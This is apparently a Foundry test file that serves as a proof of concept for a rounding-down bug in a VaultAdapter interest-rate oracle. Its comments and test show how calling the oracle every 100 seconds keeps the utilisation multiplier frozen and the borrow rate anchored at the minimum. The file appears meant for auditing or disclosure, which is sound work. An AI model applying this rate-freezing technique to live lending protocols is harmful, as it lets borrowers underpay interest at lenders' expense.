// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// Target contracts
import { VaultAdapter } from "../../contracts/oracle/libraries/VaultAdapter.sol";
import { IVaultAdapter } from "../../contracts/interfaces/IVaultAdapter.sol";
import { IAccessControl } from "../../contracts/interfaces/IAccessControl.sol";

/**
 * @title ExploitTest
 * @notice Demonstrates the rounding-down bug in VaultAdapter that allows an
 *         attacker to completely freeze the utilisation multiplier by calling
 *         the oracle in very small intervals.
 *
 * The vulnerable calculation is:
 *     (_elapsed * rate / 1e27)
 * Because Solidity truncates during division, this value rounds down to zero
 * when  _elapsed * rate  <  1e27.  By ensuring that each observation window
 * keeps _elapsed below   floor(1e27 / rate),   the term becomes zero and the
 * multiplier expression:
 *     multiplier = multiplier * ( 1e27 + X * (_elapsed * rate / 1e27) ) / 1e27
 * reduces to:
 *     multiplier = multiplier * ( 1e27 + 0 ) / 1e27 == multiplier
 * i.e. the multiplier never moves.  The attack therefore prevents the borrow
 * rate from increasing (or decreasing) even when utilisation is far from the
 * kink.
 *
 * This test performs two experiments with identical initial conditions:
 *   1. Single oracle update after a long interval (24 hours)
 *   2. 24 hours broken into 100-second slices with an oracle call each slice
 *
 * The first case produces a higher interest rate, proving the multiplier moved.
 * The second case leaves the rate anchored at the minimum, proving the bug.
 */
/*//////////////////////////////////////////////////////////////
                            Mocks
//////////////////////////////////////////////////////////////*/

/// @dev Very small, always-true access control so we can call restricted
///      functions (setSlopes, setLimits) from the test contract.
contract AccessControlMock is IAccessControl {
    function initialize(address) external {}
    function grantAccess(bytes4, address, address) external {}
    function revokeAccess(bytes4, address, address) external {}
    function checkAccess(bytes4, address, address) external pure returns (bool) {
        return true; // unconditional approval
    }
    function role(bytes4, address) external pure returns (bytes32) {
        return bytes32(0);
    }
}

/// @dev Minimal Vault implementation that exposes constant utilisation and
///      returns a synthetic utilisation index so that
///      (indexNew-indexOld)/(tNew-tOld) equals `utilisation`.
contract MockVault {
    uint256 public util; // utilisation in ray (1e27)

    /// @notice Set the utilisation value returned by the oracle queries
    function setUtil(uint256 _u) external {
        util = _u;
    }

    /// @dev Cap protocol interface – not used by the adapter in this test
    function utilization(address /*asset*/) external view returns (uint256) {
        return util;
    }

    /// @dev Returns util * block.timestamp so that the average utilisation
    ///      inside VaultAdapter.rate equals `util` for constant utilisation.
    function currentUtilizationIndex(address /*asset*/) external view returns (uint256) {
        return util * block.timestamp;
    }
}

/*//////////////////////////////////////////////////////////////
                        Exploit Test Contract
//////////////////////////////////////////////////////////////*/

contract ExploitTest is Test {
    /*//////////////////////////////////////////////////////////////
                            Test variables
    //////////////////////////////////////////////////////////////*/

    AccessControlMock internal accessControl;
    VaultAdapter internal adapter;
    MockVault internal vault;
    address internal constant ASSET = address(0xBEEF);

    /// Constants for the scenario
    uint256 internal constant KINK        = 0.8e27; // 80 % utilisation
    uint256 internal constant UTIL_BEFORE = 0.5e27; // 50 % – below kink
    uint256 internal constant UTIL_AFTER  = 0.9e27; // 90 % – above kink

    uint256 internal constant SLOPE0 = 1e25; // 1 % (pre-kink)
    uint256 internal constant SLOPE1 = 5e25; // 5 % (post-kink)

    uint256 internal constant MAX_MULT = 2e27;  // 2x
    uint256 internal constant MIN_MULT = 1e27;  // 1x  (initial multiplier)

    // Chosen so that one-second intervals round the term to zero, but one day
    // is large enough to make the term >= 1.
    uint256 internal constant RATE = 1e23; // 1e23 ≈ 0.0001 % per second

    uint256 internal constant DAY  = 24 hours;
    uint256 internal constant STEP = 100; // 100-second slices for the attack

    /*//////////////////////////////////////////////////////////////
                              setUp
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        // deploy mocks
        accessControl = new AccessControlMock();
        vault = new MockVault();

        // Deploy the logic contract
        VaultAdapter logic = new VaultAdapter();

        // Encode initializer data
        bytes memory initData = abi.encodeWithSelector(VaultAdapter.initialize.selector, address(accessControl));

        // Deploy proxy so that initializer can be executed
        ERC1967Proxy proxy = new ERC1967Proxy(address(logic), initData);
        adapter = VaultAdapter(payable(address(proxy)));

        // Configure slopes & limits
        IVaultAdapter.SlopeData memory slopes = IVaultAdapter.SlopeData({
            kink:   KINK,
            slope0: SLOPE0,
            slope1: SLOPE1
        });
        adapter.setSlopes(ASSET, slopes);
        adapter.setLimits(MAX_MULT, MIN_MULT, RATE);

        // Initialise multiplier by performing a first rate update with low utilisation
        vault.setUtil(UTIL_BEFORE);
        adapter.rate(address(vault), ASSET);
    }

    /*//////////////////////////////////////////////////////////////
                          Vulnerability test
    //////////////////////////////////////////////////////////////*/

    function testFrequentOracleCallsFreezeMultiplier() public {
        // Snapshot state right after the initialisation above
        uint256 snap = vm.snapshot();

        /*———————————— 1. SINGLE CALL AFTER 1 DAY ————————————*/

        // Jump forward 24 hours and switch utilisation to > kink
        vm.warp(block.timestamp + DAY);
        vault.setUtil(UTIL_AFTER);

        // One oracle update – multiplier SHOULD move
        uint256 rateSingleCall = adapter.rate(address(vault), ASSET);

        /*———————————— 2. MANY SMALL CALLS OVER 1 DAY ———————————*/

        // Revert EVM to snapshot so we start from identical state & timestamp
        vm.revertTo(snap);

        uint256 targetTime = block.timestamp + DAY; // 24 hours ahead
        uint256 nextTime   = block.timestamp + STEP;

        // Move utilisation above kink for the whole duration
        vault.setUtil(UTIL_AFTER);

        // Repeatedly poke the oracle every `STEP` seconds
        while (nextTime <= targetTime) {
            vm.warp(nextTime);
            adapter.rate(address(vault), ASSET);
            nextTime += STEP;
        }

        // Make one last call exactly at 24 hours to capture the final rate
        vm.warp(targetTime);
        uint256 rateManyCalls = adapter.rate(address(vault), ASSET);

        /*——————————————  Assertion  ——————————————*/

        // In the vulnerable implementation the single-call scenario yields a
        // strictly higher rate because the multiplier shifted, whereas the
        // many-call scenario kept the multiplier anchored at MIN_MULT.
        assertGt(rateSingleCall, rateManyCalls);
    }
}